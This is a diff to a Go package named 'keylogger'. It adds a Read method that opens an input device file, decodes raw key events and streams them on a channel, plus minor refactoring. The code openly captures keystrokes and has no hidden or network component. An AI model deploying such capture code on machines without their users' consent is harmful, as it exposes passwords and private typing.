@@ -1,6 +1,12 @@
 package keylogger
 
 import (
+	"bytes"
+	"context"
+	"encoding/binary"
+	"fmt"
+	"os"
+	"strings"
 	"syscall"
 	"unsafe"
 )
@@ -9,6 +15,7 @@ import (
 type InputDevice struct {
 	ID   int
 	Name string
+	File *os.File
 }
 
 // InputEvent is an event invoked by and InputDevice
@@ -22,8 +29,7 @@ type InputEvent struct {
 var eventSize = int(unsafe.Sizeof(InputEvent{}))
 
 func newInputDevice(buff []byte, id int) *InputDevice {
-	name := string(buff)
-
+	name := strings.TrimSpace(string(buff))
 	return &InputDevice{
 		ID:   id,
 		Name: name,
@@ -33,6 +39,51 @@ func newInputDevice(buff []byte, id int) *InputDevice {
 // KeyString returns the text code of the pressed key
 func (ie InputEvent) KeyString() string {
 	return keyCodes[ie.Code]
+}
+
+// Read the device file and send InputEvents on a channel.
+func (d *InputDevice) Read(ctx context.Context, cie chan InputEvent, cer chan error) {
+	var err error
+
+	defer func() {
+		d.File.Close()
+	}()
+
+	// TODO: Check if file exists first?
+	d.File, err = os.Open(fmt.Sprintf(deviceFile, d.ID))
+	if err != nil {
+		cer <- err
+		return
+	}
+
+	b := make([]byte, eventSize)
+	e := InputEvent{}
+
+	for {
+		n, err := d.File.Read(b)
+		// Check if the goroutine needs to be cancelled.
+		select {
+		case <-ctx.Done():
+			return
+		default:
+		}
+
+		if err != nil {
+			cer <- err
+			return
+		}
+
+		if n <= 0 {
+			continue
+		}
+
+		if err := binary.Read(bytes.NewBuffer(b), binary.LittleEndian, &e); err != nil {
+			cer <- err
+			return
+		}
+
+		cie <- e
+	}
 }
 
 var keyCodes = map[uint16]string{
